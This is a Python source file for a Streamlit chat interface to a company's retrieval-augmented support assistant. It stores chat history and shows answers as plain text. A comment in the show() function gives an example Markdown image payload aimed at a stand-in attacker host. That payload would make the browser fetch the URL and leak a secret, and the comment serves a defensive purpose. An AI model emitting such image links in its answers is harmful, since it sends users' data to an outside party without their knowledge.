"""Streamlit chat UI for the Northwind Gadgets RAG assistant.

Run with: streamlit run app.py
"""

import streamlit as st

from rag import EXPECTED_ERRORS, answer

# Page text: change these to reword the UI.
PAGE_TITLE = "Northwind Gadgets Support"
PAGE_CAPTION = "Ask questions about Northwind's policies. Answers come from the company docs."

st.set_page_config(page_title=PAGE_TITLE)
st.title(PAGE_TITLE)
st.caption(PAGE_CAPTION)

# Streamlit reruns this whole script on every interaction, so normal variables
# reset each time. session_state survives reruns, so the chat history lives there.
if "messages" not in st.session_state:
    st.session_state.messages = []

def show(message: dict) -> None:
    """Draw one chat message."""
    with st.chat_message(message["role"]):
        if message.get("error"):
            st.error(message["content"])
        else:
            # Plain text on purpose: Markdown would let a model answer like
            # ![](https://attacker.example/?code=SECRET) make the browser load
            # that URL automatically, leaking data without a click.
            st.text(message["content"])


def add(message: dict) -> None:
    """Save a message to the history and draw it."""
    st.session_state.messages.append(message)
    show(message)


# Redraw the conversation so far.
for message in st.session_state.messages:
    show(message)

# chat_input returns the new question once, on the rerun right after it's sent.
if question := st.chat_input("Ask about Northwind Gadgets"):
    add({"role": "user", "content": question})
    try:
        with st.spinner("Thinking..."):
            # Each question is answered on its own: the model doesn't see the history.
            text, _retrieved_files = answer(question)  # files are shown in #6
    except EXPECTED_ERRORS as error:
        add({"role": "assistant", "content": f"Error: {error}", "error": True})
    else:
        add({"role": "assistant", "content": text})
